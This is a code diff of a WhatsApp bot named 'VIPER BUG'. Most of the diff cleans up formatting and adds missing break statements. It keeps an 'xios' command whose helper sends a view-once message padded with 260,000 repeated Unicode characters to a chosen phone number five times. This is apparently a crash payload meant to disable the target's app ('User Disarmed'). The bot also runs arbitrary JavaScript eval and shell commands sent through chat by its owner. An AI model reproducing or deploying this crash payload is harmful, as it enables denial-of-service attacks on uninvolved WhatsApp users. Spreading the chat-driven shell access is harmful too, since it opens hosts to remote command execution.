@@ -178,7 +178,7 @@ conn.ev.on('messages.upsert', async ({ messages, type }) => {
         const fromMe = msg.key.fromMe;
         if (!conn.public && !fromMe) return;
 
-        // Handle ephemeral
+        // Handle ephemeral messages
         msg.message = msg.message?.ephemeralMessage?.message || msg.message;
         const m = smsg(JSON.parse(JSON.stringify(msg)), conn);
         const typeMsg = getContentType(msg.message);
@@ -193,7 +193,7 @@ conn.ev.on('messages.upsert', async ({ messages, type }) => {
             typeMsg === 'buttonsResponseMessage' ? msg.message.buttonsResponseMessage.selectedButtonId :
             typeMsg === 'listResponseMessage' ? msg.message.listResponseMessage.singleSelectReply.selectedRowId :
             ''
-        ) || '';
+        )?.trim() || '';
 
         const prefix = settings.prefix || '.';
         const isCmd = body.startsWith(prefix);
@@ -206,7 +206,7 @@ conn.ev.on('messages.upsert', async ({ messages, type }) => {
         const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net';
         const pushname = msg.pushName || 'Unknown';
 
-        // Log incoming messages in styled format
+        // Styled message logs
         console.log(
             chalk.greenBright('📩 New Message:'),
             chalk.cyan(`${pushname} (${senderNumber})`),
@@ -214,61 +214,66 @@ conn.ev.on('messages.upsert', async ({ messages, type }) => {
             chalk.magentaBright(isCmd ? `>> ${command}` : `>> ${body.slice(0, 30)}...`)
         );
 
-        // Load owner list
+        // Owner check
         const ownerList = JSON.parse(fs.readFileSync('./developers.json'));
         const isCreator = [botNumber, ...ownerList.map(n => `${n.replace(/\D/g, '')}@s.whatsapp.net`)].includes(sender);
 
-        // Group metadata
+        // Group info
         let groupMetadata = {}, groupAdmins = [];
         if (isGroup) {
             groupMetadata = await conn.groupMetadata(chat).catch(() => ({}));
-            groupAdmins = groupMetadata.participants?.filter(p => p.admin).map(p => p.id) || [];
+            groupAdmins = Array.isArray(groupMetadata.participants)
+                ? groupMetadata.participants.filter(p => p.admin).map(p => p.id)
+                : [];
         }
-        const isAdmin = groupAdmins.includes(sender);
+
+        const cleanSender = sender.split(':')[0] + '@s.whatsapp.net';
+        const isAdmin = groupAdmins.includes(sender) || groupAdmins.includes(cleanSender);
         const isBotAdmin = groupAdmins.includes(botNumber);
 
-        // Helper
+        // Helper functions
         async function xiosinv(bad, target) {
-       tmsg = await generateWAMessageFromContent(target, {
-               viewOnceMessage: {
-                   message: {
-                       listResponseMessage: {
-                           title: '@kingbadboi\n',
-                           description:"\n\n\n"+"𑪆".repeat(260000),
-                           singleSelectReply: {
-                               selectedId: "id"
-                           },
-                           listType: 1
-                       }
-                   }
-               }
-       }, {});
+            tmsg = await generateWAMessageFromContent(target, {
+                viewOnceMessage: {
+                    message: {
+                        listResponseMessage: {
+                            title: '𝙺𝚄𝙽𝙻𝙴 𝚇𝙾𝚇𝙾\n',
+                            description: "\n\n\n" + "𑪆".repeat(260000),
+                            singleSelectReply: {
+                                selectedId: "id"
+                            },
+                            listType: 1
+                        }
+                    }
+                }
+            }, {});
 
-       await bad.relayMessage("status@broadcast", tmsg.message, {
-           messageId: tmsg.key.id,
-           statusJidList: [target],
-           additionalNodes: [{
-               tag: "meta",
-               attrs: {},
-               content: [{
-                   tag: "mentioned_users",
-                   attrs: {},
-                   content: [{
-                       tag: "to",
-                       attrs: { jid: target },
-                       content: undefined,
-                   }],
-               }],
-           }],
-       });
-       }
+            await bad.relayMessage("status@broadcast", tmsg.message, {
+                messageId: tmsg.key.id,
+                statusJidList: [target],
+                additionalNodes: [{
+                    tag: "meta",
+                    attrs: {},
+                    content: [{
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [{
+                            tag: "to",
+                            attrs: { jid: target },
+                            content: undefined,
+                        }],
+                    }],
+                }],
+            });
+        }
+
         const send = async (text) => conn.sendMessage(chat, { text });
         const xreply = async (text) => conn.sendMessage(chat, {
             text,
             contextInfo: {
                 mentionedJid: [sender],
                 externalAdReply: {
-                    title: "Viper WhatsApp Bot",
+                    title: "𝐕𝐈𝐏𝐄𝐑 𝐁𝐔𝐆",
                     body: pushname,
                     mediaUrl: "https://t.me/lonelydeveloper",
                     sourceUrl: "https://t.me/gabimarutechchannel",
@@ -286,80 +291,85 @@ conn.ev.on('messages.upsert', async ({ messages, type }) => {
                     const end = speed();
                     return send(`🏓 PONG: ${Math.floor(end - start)}ms`);
                 }
-                
+
                 case "public": {
-                 if (!isCreator) {
-                         return;
-                       }
-			     	xreply("Status has successfully changed to public")
-		                   	conn.public = true
-	                 	}
+                    if (!isCreator) return;
+                    xreply("Status has successfully changed to public");
+                    conn.public = true;
+                    break;
+                }
 
-			case "self": {
-if (!isCreator) {
-    return;
-  }
-				xreply("Status has sucessfully changed to private")
-				conn.public = false
-			}
+                case "self": {
+                    if (!isCreator) return;
+                    xreply("Status has successfully changed to private");
+                    conn.public = false;
+                    break;
+                }
 
-                case 'creategc': case 'creategroup': {
-if (!isCreator) {
-return;
-}
-if (!args.join(" ")) return xreply(`Use ${prefix+command} groupname`)
-let cret = await conn.groupCreate(args.join(" "), [])
-let response = await conn.groupInviteCode(cret.id)
-let capt = `     「 Created Group 」
+                case 'creategc':
+                case 'creategroup': {
+                    if (!isCreator) return;
+                    if (!args.join(" ")) return xreply(`Use ${prefix + command} groupname`);
+                    let cret = await conn.groupCreate(args.join(" "), []);
+                    let response = await conn.groupInviteCode(cret.id);
+                    let capt = `     「 Created Group 」
 
 ▸ Name : ${cret.subject}
 ▸ Owner : @${cret.owner.split("@")[0]}
 ▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}
 
-https://chat.whatsapp.com/${response}
-       `;
-await conn.sendMessage(chat, { text: capt})
-}
-case "subject": case "changesubject": { 
-if (!isGroup) return send("This command is only for groups");
-if (!isBotAdmin) return send(`I Need Admin Privileges To Complete This command`) 
-if (!isAdmins) return send(`Only for admins`)
-if (!q) return send(`provide text for gc subject`)
-await conn.groupUpdateSubject(chat, `${q}`); 
- xreply('Group name successfully updated!'); 
-} 
-           case "desc": case "setdesc": { 
-                 if (!isGroup) return send("This command is only for groups");
-                 if (!isBotAdmin) return send(`I Need Admin Privileges To Complete This command`) 
-                 if (!isAdmins) return send(`Only for admins`)
-                 if (!q) return send(`provide text for gc desc`)
-                 await conn.groupUpdateDescription(chat, `${q}`); 
- xreply(`Group description successfully updated! 👥\n> 𝐆𝐚𝐛𝐢𝐦𝐚𝐫𝐮`); 
-             }
- case "disp-off": { 
-                 if (!isGroup) return send("This command is only for groups");
-                 if (!isBotAdmin) return send(`Bot must be admin`);
-                 if (!isAdmins) return send(`Only for admins`);
-  
-                     await conn.groupToggleEphemeral(chat, 0); 
- xreply('Dissapearing messages successfully turned off!'); 
- }
- 
- case "xios": {
- if (!isCreator) return send("Don't think you can fool me, you're not premium user");
- const target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net";
- if (!q) return send("Usage: `xios 234xxx`");
-  
- for (let i = 0; i < 5; i++) {
- await xiosinv(conn, target);
- }
- send(`${target}: User Disarmed ❌`);
- }
-case 'menu': {
-const image = "https://files.catbox.moe/yqfzkv.jpg";
-return conn.sendMessage(chat, {
-image: { url: image },
-caption: `
+https://chat.whatsapp.com/${response}`;
+                    await conn.sendMessage(chat, { text: capt });
+                    break;
+                }
+
+                case "subject":
+                case "changesubject": {
+                    if (!isGroup) return send("This command is only for groups");
+                    if (!isBotAdmin) return send("I Need Admin Privileges To Complete This command");
+                    if (!isAdmin) return send("Only for admins");
+                    if (!q) return send("Provide text for group subject");
+                    await conn.groupUpdateSubject(chat, q);
+                    xreply('Group name successfully updated!');
+                    break;
+                }
+
+                case "desc":
+                case "setdesc": {
+                    if (!isGroup) return send("This command is only for groups");
+                    if (!isBotAdmin) return send("I Need Admin Privileges To Complete This command");
+                    if (!isAdmin) return send("Only for admins");
+                    if (!q) return send("Provide text for group description");
+                    await conn.groupUpdateDescription(chat, q);
+                    xreply(`Group description successfully updated! 👥\n> 𝐆𝐚𝐛𝐢𝐦𝐚𝐫𝐮`);
+                    break;
+                }
+
+                case "disp-off": {
+                    if (!isGroup) return send("This command is only for groups");
+                    if (!isBotAdmin) return send("Bot must be admin");
+                    if (!isAdmin) return send("Only for admins");
+                    await conn.groupToggleEphemeral(chat, 0);
+                    xreply('Disappearing messages successfully turned off!');
+                    break;
+                }
+
+                case "xios": {
+                    if (!isCreator) return send("Don't think you can fool me, you're not premium user");
+                    if (!q) return send("Usage: `xios 234xxx`");
+                    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+                    for (let i = 0; i < 5; i++) {
+                        await xiosinv(conn, target);
+                    }
+                    send(`${target}: User Disarmed ❌`);
+                    break;
+                }
+
+                case 'menu': {
+                    const image = "https://files.catbox.moe/yqfzkv.jpg";
+                    await conn.sendMessage(chat, {
+                        image: { url: image },
+                        caption: `
 𝗕𝗼𝘁: 𝐕𝐈𝐏𝐄𝐑: 𝐀𝐖𝐀𝐊𝐄𝐍𝐈𝐍𝐆 🧭
 𝗗𝗲𝘃: 𝐆𝐚𝐛𝐢𝐦𝐚𝐫𝐮
 𝗩𝗲𝗿𝘀𝗶𝗼𝗻: 𝐖𝐡𝐚𝐭𝐗𝐓𝐞𝐥𝐞
@@ -379,19 +389,18 @@ caption: `
 
 𝖢𝗋𝖾𝖺𝗍𝖾𝖽 𝖻𝗒 ayokunledavid.t.me
 `
-});
-}
-                
-case 'kick':
-case 'remove': {
-if (!q) {
-return send(`Usage: .${command || "kick"} @user`);
-} else {
-jid = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-await conn.groupParticipantsUpdate(chat, [jid], 'remove')
-xreply(`${jid} Has Successfully Been Removed`);
-}
-}
+                    });
+                    break;
+                }
+
+                case 'kick':
+                case 'remove': {
+                    if (!q) return send(`Usage: .${command || "kick"} @user`);
+                    const jid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
+                    await conn.groupParticipantsUpdate(chat, [jid], 'remove');
+                    xreply(`${jid} has successfully been removed`);
+                    break;
+                }
 
                 case 'group-link':
                 case 'gclink': {
@@ -400,39 +409,35 @@ xreply(`${jid} Has Successfully Been Removed`);
                     return send(`🔗 Group Link:\nhttps://chat.whatsapp.com/${code}`);
                 }
 
-                case 'say': {
-                    if (!q) return send("❌ Please provide a message.");
-                    return send(q);
-                }
-            }
-        }
+                default:
+                    if (isCreator && body.startsWith('=>')) {
+                        try {
+                            const result = await eval(`(async () => { return ${body.slice(3)} })()`);
+                            return send(util.format(result));
+                        } catch (e) {
+                            return send(String(e));
+                        }
+                    }
 
-        // Owner eval
-        if (isCreator && body.startsWith('=>')) {
-            try {
-                const result = await eval(`(async () => { return ${body.slice(3)} })()`);
-                return send(util.format(result));
-            } catch (e) {
-                return send(String(e));
-            }
-        }
+                    if (isCreator && body.startsWith('>')) {
+                        try {
+                            let evaled = await eval(body.slice(2));
+                            if (typeof evaled !== 'string') evaled = util.inspect(evaled);
+                            return send(evaled);
+                        } catch (err) {
+                            return send(String(err));
+                        }
+                    }
 
-        if (isCreator && body.startsWith('>')) {
-            try {
-                let evaled = await eval(body.slice(2));
-                if (typeof evaled !== 'string') evaled = util.inspect(evaled);
-                return send(evaled);
-            } catch (err) {
-                return send(String(err));
+                    if (isCreator && body.startsWith('$')) {
+                        exec(body.slice(2), (err, stdout, stderr) => {
+                            if (err) return send(err.message);
+                            if (stdout) return send(stdout);
+                            if (stderr) return send(stderr);
+                        });
+                    }
+                    break;
             }
-        }
-
-        if (isCreator && body.startsWith('$')) {
-            exec(body.slice(2), (err, stdout, stderr) => {
-                if (err) return send(err.message);
-                if (stdout) return send(stdout);
-                if (stderr) return send(stderr);
-            });
         }
 
     } catch (err) {
